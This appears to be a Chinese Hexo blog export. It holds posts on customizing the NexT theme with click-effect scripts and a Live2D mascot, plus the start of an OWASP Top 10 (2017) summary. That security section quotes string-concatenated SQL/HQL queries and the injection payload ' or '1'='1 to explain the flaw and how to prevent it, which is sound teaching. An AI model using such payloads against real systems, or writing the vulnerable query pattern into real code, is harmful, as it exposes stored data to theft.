<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;</span>============本文结束( ´◔ ‸◔`)感谢您的阅读============<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开<code>\themes\next\layout\_macro\post.swig</code>，在<code>post-body</code>之后，<code>post-footer</code>之前添加:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include 'passage-end-tag.swig' %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开主题配置文件在末尾添加“本文结束”标记：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure>

<h3 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h3><p><strong>** 爆炸效果**</strong><br><code>next/source/js中新建firework.js</code>，并将粘贴代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">"use strict"</span>;<span class="keyword">function</span> updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="keyword">function</span> setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;<span class="built_in">return</span>&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;<span class="keyword">function</span> createParticule(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="keyword">function</span> createCircle(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=<span class="string">"#F00"</span>,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;<span class="keyword">function</span> renderParticule(e)&#123;<span class="keyword">for</span>(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="keyword">function</span> animateParticules(e,t)&#123;<span class="keyword">for</span>(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.x&#125;,y:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:<span class="string">"linear"</span>,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule,offset:0&#125;)&#125;<span class="keyword">function</span> debounce(e,t)&#123;var a;<span class="built_in">return</span> <span class="function"><span class="title">function</span></span>()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(<span class="function"><span class="title">function</span></span>()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="string">".fireworks"</span>);<span class="keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="string">"2d"</span>),numberOfParticules=30,pointerX=0,pointerY=0,tap=<span class="string">"mousedown"</span>,colors=[<span class="string">"#FF1461"</span>,<span class="string">"#18FF92"</span>,<span class="string">"#5A87FF"</span>,<span class="string">"#FBF38C"</span>],setCanvasSize=debounce(<span class="function"><span class="title">function</span></span>()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="string">"px"</span>,canvasEl.style.height=window.innerHeight+<span class="string">"px"</span>,canvasEl.getContext(<span class="string">"2d"</span>).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:<span class="function"><span class="title">function</span></span>()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,<span class="keyword">function</span>(e)&#123;<span class="string">"sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"toggle-sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"A"</span>!==e.target.nodeName&amp;&amp;<span class="string">"IMG"</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(<span class="string">"resize"</span>,setCanvasSize,!1)&#125;<span class="string">"use strict"</span>;<span class="keyword">function</span> updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="keyword">function</span> setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;<span class="built_in">return</span>&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;<span class="keyword">function</span> createParticule(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="keyword">function</span> createCircle(e,t)&#123;var a=&#123;&#125;;<span class="built_in">return</span> a.x=e,a.y=t,a.color=<span class="string">"#F00"</span>,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=<span class="function"><span class="title">function</span></span>()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;<span class="keyword">function</span> renderParticule(e)&#123;<span class="keyword">for</span>(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="keyword">function</span> animateParticules(e,t)&#123;<span class="keyword">for</span>(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.x&#125;,y:<span class="keyword">function</span>(e)&#123;<span class="built_in">return</span> e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:<span class="string">"linear"</span>,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:<span class="string">"easeOutExpo"</span>,update:renderParticule,offset:0&#125;)&#125;<span class="keyword">function</span> debounce(e,t)&#123;var a;<span class="built_in">return</span> <span class="function"><span class="title">function</span></span>()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(<span class="function"><span class="title">function</span></span>()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(<span class="string">".fireworks"</span>);<span class="keyword">if</span>(canvasEl)&#123;var ctx=canvasEl.getContext(<span class="string">"2d"</span>),numberOfParticules=30,pointerX=0,pointerY=0,tap=<span class="string">"mousedown"</span>,colors=[<span class="string">"#FF1461"</span>,<span class="string">"#18FF92"</span>,<span class="string">"#5A87FF"</span>,<span class="string">"#FBF38C"</span>],setCanvasSize=debounce(<span class="function"><span class="title">function</span></span>()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+<span class="string">"px"</span>,canvasEl.style.height=window.innerHeight+<span class="string">"px"</span>,canvasEl.getContext(<span class="string">"2d"</span>).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:<span class="function"><span class="title">function</span></span>()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,<span class="keyword">function</span>(e)&#123;<span class="string">"sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"toggle-sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"A"</span>!==e.target.nodeName&amp;&amp;<span class="string">"IMG"</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(<span class="string">"resize"</span>,setCanvasSize,!1)&#125;;</span><br></pre></td></tr></table></figure>
<p>打开<code>./themes/next/layout/_layout.swig</code> 并在 <code>&lt;head&gt;</code> 中间添加以下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!-- 爆炸效果 --&gt;</span><br><span class="line">&lt;canvas class=<span class="string">"fireworks"</span> style=<span class="string">"position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"</span> &gt;&lt;/canvas&gt; </span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span> src=<span class="string">"//cdn.bootcss.com/animejs/2.2.0/anime.min.js"</span>&gt;&lt;/script&gt; </span><br><span class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span> src=<span class="string">"/js/firework.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>打开<code>./themes/next</code>路径下的<code>_config.yml</code>文件并在末尾添加以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Fireworks</span><br><span class="line">fireworks: true</span><br></pre></td></tr></table></figure>
<p>这爆炸······怎么波浪总是延迟，<br><strong>** 爱心 **</strong><br>在<code>next/source/js</code>中新建<code>clicklove.js</code>，并将粘贴下列代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">!<span class="keyword">function</span>(e,t,a)&#123;<span class="keyword">function</span> <span class="function"><span class="title">n</span></span>()&#123;c(<span class="string">".heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;"</span>),o(),r()&#125;<span class="keyword">function</span> <span class="function"><span class="title">r</span></span>()&#123;<span class="keyword">for</span>(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=<span class="string">"left:"</span>+d[e].x+<span class="string">"px;top:"</span>+d[e].y+<span class="string">"px;opacity:"</span>+d[e].alpha+<span class="string">";transform:scale("</span>+d[e].scale+<span class="string">","</span>+d[e].scale+<span class="string">") rotate(45deg);background:"</span>+d[e].color+<span class="string">";z-index:99999"</span>);requestAnimationFrame(r)&#125;<span class="keyword">function</span> <span class="function"><span class="title">o</span></span>()&#123;var t=<span class="string">"function"</span>==typeof e.onclick&amp;&amp;e.onclick;e.onclick=<span class="keyword">function</span>(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="keyword">function</span> i(e)&#123;var a=t.createElement(<span class="string">"div"</span>);a.className=<span class="string">"heart"</span>,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;<span class="keyword">function</span> c(e)&#123;var a=t.createElement(<span class="string">"style"</span>);a.type=<span class="string">"text/css"</span>;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">"head"</span>)[0].appendChild(a)&#125;<span class="keyword">function</span> <span class="function"><span class="title">s</span></span>()&#123;<span class="built_in">return</span><span class="string">"rgb("</span>+~~(255*Math.random())+<span class="string">","</span>+~~(255*Math.random())+<span class="string">","</span>+~~(255*Math.random())+<span class="string">")"</span>&#125;var d=[];e.requestAnimationFrame=<span class="function"><span class="title">function</span></span>()&#123;<span class="built_in">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="keyword">function</span>(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br></pre></td></tr></table></figure>
<p>打开<code>/next/layout/_layout.swig</code>并在末尾添加以下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击心形 --&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;clicklove.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="代码框复制按钮"><a href="#代码框复制按钮" class="headerlink" title="代码框复制按钮"></a>代码框复制按钮</h3><p>next主题配置找到打开<br>找到codeblock:</p>
<h3 id="加载条"><a href="#加载条" class="headerlink" title="加载条"></a>加载条</h3><p>切换到Next主题文件夹<br>安装模块到<code>source/lib</code>文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;theme-next-pace source&#x2F;lib&#x2F;pace</span><br></pre></td></tr></table></figure>
<p>打开Next主题路径下的配置文件_config.yml，搜索pace定位找到&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Progress bar in the top during page loading.</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;theme-next&#x2F;theme-next-pace</span><br><span class="line">pace: true</span><br><span class="line"># Themes list:</span><br><span class="line"># pace-theme-big-counter | pace-theme-bounce | pace-theme-barber-shop | pace-theme-center-atom</span><br><span class="line"># pace-theme-center-circle | pace-theme-center-radar | pace-theme-center-simple | pace-theme-corner-indicator</span><br><span class="line"># pace-theme-fill-left | pace-theme-flash | pace-theme-loading-bar | pace-theme-mac-osx | pace-theme-minimal</span><br><span class="line">pace_theme: pace-theme-flash</span><br></pre></td></tr></table></figure>
<p>加了看板娘总是跳出加载条，又还是禁用了</p>
<h3 id="鼠标"><a href="#鼠标" class="headerlink" title="鼠标"></a>鼠标</h3><p>在<code>/themes/next/source/css/main.styl</code> 添加样式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 鼠标样式 *&#x2F;</span><br><span class="line">* &#123;</span><br><span class="line">  cursor: url(&#x2F;images&#x2F;default.cur),auto;</span><br><span class="line">&#125;</span><br><span class="line">:link &#123;</span><br><span class="line">  cursor: url(&#x2F;images&#x2F;pointer.cur),auto</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用到的光标文件：<code>default.cur、pointer.cur</code> 放在 <code>images</code> 目录下，<code>.cur</code>是静态光标文件，</p>
<h3 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h3><p>在 <code>/themes/next/layout/</code> 目录下，新增 <code>tag-color.swig</code> 文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">     var alltags &#x3D; document.getElementsByClassName(&#39;tag-cloud-tags&#39;);</span><br><span class="line">     var tags &#x3D; alltags[0].getElementsByTagName(&#39;a&#39;);</span><br><span class="line">     for (var i &#x3D; tags.length - 1; i &gt;&#x3D; 0; i--) &#123;</span><br><span class="line">       var r&#x3D;Math.floor(Math.random()*75+130);</span><br><span class="line">       var g&#x3D;Math.floor(Math.random()*75+100);</span><br><span class="line">       var b&#x3D;Math.floor(Math.random()*75+80);</span><br><span class="line">       tags[i].style.background &#x3D; &quot;rgb(&quot;+r+&quot;,&quot;+g+&quot;,&quot;+b+&quot;)&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">  .tag-cloud-tags&#123;</span><br><span class="line">    &#x2F;*font-family: Helvetica, Tahoma, Arial;*&#x2F;</span><br><span class="line">    &#x2F;*font-weight: 100;*&#x2F;</span><br><span class="line">    text-align: center;</span><br><span class="line">    counter-reset: tags;</span><br><span class="line">  &#125;</span><br><span class="line">  .tag-cloud-tags a&#123;</span><br><span class="line">    border-radius: 6px;</span><br><span class="line">    padding-right: 5px;</span><br><span class="line">    padding-left: 5px;</span><br><span class="line">    margin: 8px 5px 0px 0px;</span><br><span class="line">  &#125;</span><br><span class="line">  .tag-cloud-tags a:before&#123;</span><br><span class="line">    content: &quot;🔖&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .tag-cloud-tags a:hover&#123;</span><br><span class="line">     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);</span><br><span class="line">     transform: scale(1.1);</span><br><span class="line">     &#x2F;*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*&#x2F;</span><br><span class="line">     transition-duration: 0.15s;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
<p>在同级目录的 <code>page.swig</code> 中引入 <code>tag-color.swig</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    &lt;div class&#x3D;&quot;tag-cloud&quot;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 目前共计xxx个标签</span><br><span class="line">        &lt;div class&#x3D;&quot;tag-cloud-title&quot;&gt;</span><br><span class="line">            &#123;&#123; _p(&#39;counter.tag_cloud&#39;, site.tags.length) &#125;&#125;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;div class&#x3D;&quot;tag-cloud-tags&quot;&gt;</span><br><span class="line">          &#123;&#123; tagcloud(&#123;min_font: 10, max_font: 15, amount: 300, color: true, start_color: &#39;#ccc&#39;, end_color: &#39;#111&#39;&#125;) &#125;&#125;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    </span><br><span class="line">+     &#123;% include &#39;tag-color.swig&#39; %&#125;</span><br><span class="line">    </span><br><span class="line">    &#123;% elif page.type &#x3D;&#x3D;&#x3D; &#39;categories&#39; %&#125;</span><br><span class="line">      &lt;div class&#x3D;&quot;category-all-page&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;category-all-title&quot;&gt;</span><br><span class="line">            &#123;&#123; _p(&#39;counter.categories&#39;, site.categories.length) &#125;&#125;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;category-all&quot;&gt;</span><br><span class="line">          &#123;&#123; list_categories() &#125;&#125;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<h3 id="readmore"><a href="#readmore" class="headerlink" title="readmore"></a>readmore</h3><p>手动截断，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- more --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2D看板娘"><a href="#2D看板娘" class="headerlink" title="2D看板娘"></a>2D看板娘</h3><p>用过官方那什么什么的忘了一下载就是shizuku，<br>后来发现还有可以换装更好玩的&gt;&gt;&gt;<br>感谢<a href="https://zhangshuqiao.org/" target="_blank" rel="noopener">张书樵大神</a>的<a href="https://github.com/stevenjoezhang/live2d-widget" target="_blank" rel="noopener">Live2D项目</a><br>把项目文件解压到Hexo/source/live2d-widget/没有<code>live2d-widget</code>要手动创建<br>要自定义看板娘初始加载模型或者互动话语的话，改live2d-widget/autoload.js&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; const live2d_path &#x3D; &quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;stevenjoezhang&#x2F;live2d-widget&#x2F;&quot;;</span><br><span class="line">const live2d_path &#x3D; &quot;&#x2F;live2d-widget&#x2F;&quot;;</span><br></pre></td></tr></table></figure>
<p>在Hexo根目录<code>/themes/next/layout/_layout.swing</code>中，<code>&lt;/body&gt;</code> 之前增加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;live2d-widget&#x2F;autoload.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>在 <code>&lt;/head&gt;</code>之前增加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;font-awesome&#x2F;css&#x2F;font-awesome.min.css&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>在主题配置文件中新增</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>自定义看板娘大小、位置或者其他样式，修改waifu.css<br>自定义看板娘言语互动，修改waifu-tips.js和waifu-tips.json<br>怎么自定义，懒得看了······</p>
<h3 id="时钟"><a href="#时钟" class="headerlink" title="时钟"></a>时钟</h3><p>代码，导入，标注主配置文件</p>
<h3 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a>分类页</h3><p>感觉还是要改一下，打开浏览器f12可以边改边看效果，虽然还是没改好，a标签下面那条横线没去掉 最后把css样式复制到style保存就行了。<br><img src="s.png" alt=""></p>
<h3 id="底部爱心"><a href="#底部爱心" class="headerlink" title="底部爱心"></a>底部爱心</h3><p><code>\themes\next\layout\_partials\footer.swig</code>文件，修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;span class&#x3D;&quot;with-love&quot; id&#x3D;&quot;animate&quot; style&#x3D;&quot;font-size: 13px&quot;&gt;</span><br><span class="line">  &lt;i class&#x3D;&quot;fa fa-heart&quot;&gt;&lt;&#x2F;i&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure>
<p>然后再打开<code>\themes\next\source\css\_common\outline\footer\footer.styl</code>改成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if hexo-config(&#39;footer.icon.animated&#39;) &#123;</span><br><span class="line">  #animate &#123;</span><br><span class="line">    animation: iconAnimate 1.88s ease-in-out infinite;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.with-love &#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  margin: 0 5px;</span><br><span class="line">  color: #FF291D;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插件    <a href="https://hexo.io/plugins/#admin" target="_blank" rel="noopener">地址直通车</a></p>
<h2 id="主题开发"><a href="#主题开发" class="headerlink" title="主题开发"></a>主题开发</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo init D:&#x2F;521&#x2F;Byself</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>友链</title>
    <url>/2020/03/19/%E5%8F%8B%E9%93%BE/</url>
    <content><![CDATA[<p><strong><strong>侧栏添加友链</strong></strong><br>先<code>hexo new page friendlink</code><br>再到主题添加<code>friendlink: /friendlink/ || link</code></p>
<a id="more"></a>
<p>最后到主题languages文件夹里的zh-CN.yml文件添加friendlink: 友链<br>保存&gt;执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<p>完成</p>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>OWASP_top10list</title>
    <url>/2020/03/19/OWASP%20Top%2010/</url>
    <content><![CDATA[<h2 id="OWASP简介"><a href="#OWASP简介" class="headerlink" title="OWASP简介"></a>OWASP简介</h2><p>OWASP（开放式web应用程序安全项目）关注web应用程序的安全。OWASP这个项目最有名的，也许就是它的”十大安全隐患列表”。这个列表不但总结了web应用程序最可能、最常见、最危险的十大安全隐患，还包括了如何消除这些隐患的建议。（另外，OWASP还有一些辅助项目和指南来帮助IT公司和开发团队来规范应用程序开发流程和测试流程，提高web产品的安全性。）这个”十大”差不多每隔三年更新一次。<a id="more"></a></p>
<h2 id="OWASP-Top-10"><a href="#OWASP-Top-10" class="headerlink" title="OWASP Top 10"></a>OWASP Top 10</h2><h3 id="A1-2017-注入"><a href="#A1-2017-注入" class="headerlink" title="A1:2017-注入"></a>A1:2017-注入</h3><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
<p>知识点简介<br>一些常见的注入，包括：SQL、OS命令、ORM、LDAP和表达式语言（EL）或OGNL注入。所有解释器的概念都是相同的。代码评审是最有效的检测应用程序的注入风险的办法之一，紧随其后的是对所有参数、字段、头、cookie、JSON和XML数据输入的彻底的DAST扫描。组织可以将SAST和DAST工具添加到CI/CD过程中，以便于在生产部署之前对现有或新检查的代码进行注入问题的预警。</p>
<p>案例场景<br>场景#1：应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据：<br>String query = “SELECT * FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“;<br>场景#2：同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如：Hibernate查询语言（HQL））：<br>Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’” + request.getParameter(“id”) + “‘“);<br>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ‘or’1’=’1。例如：<br><a href="http://example.com/app/accountView?id=&#39;" target="_blank" rel="noopener">http://example.com/app/accountView?id=&#39;</a> or ‘1’=’1</p>
<p>这样查询语句的意义就变成了从accounts表中返回所有的记录。更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p>
<p>如何防止?<br>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br>注意：当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。<br>使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。<br>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。OWASP的Java Encoder和类似的库提供了这样的转义例程。<br>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。<br>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</p>
<h3 id="A2-2017-失效的身份认证"><a href="#A2-2017-失效的身份认证" class="headerlink" title="A2:2017-失效的身份认证"></a>A2:2017-失效的身份认证</h3><p>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
<p>知识点简介<br>确认用户的身份、身份验证和会话管理非常重要，这些措施可用于将恶意的未经身份验证的攻击者与授权用户进行分离。如果您的应用程序存在如下问题，那么可能存在身份验证的脆弱性：</p>
<p>允许密码填充，这使得攻击者获得有效用户名和密码的列表。<br>允许暴力破解或其他自动攻击。<br>允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin”。<br>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。<br>使用明文、加密或弱散列密码（参见：A3:2017-敏感数据泄露）。<br>缺少或失效的多因素身份验证。<br>暴露URL中的会话ID（例如URL重写）。<br>在成功登录后不会更新会话ID。<br>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。<br>案例场景<br>场景#1：<br>凭证填充，使用已知密码的列表，是常见的攻击。如果应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，以确定凭证是否有效。</p>
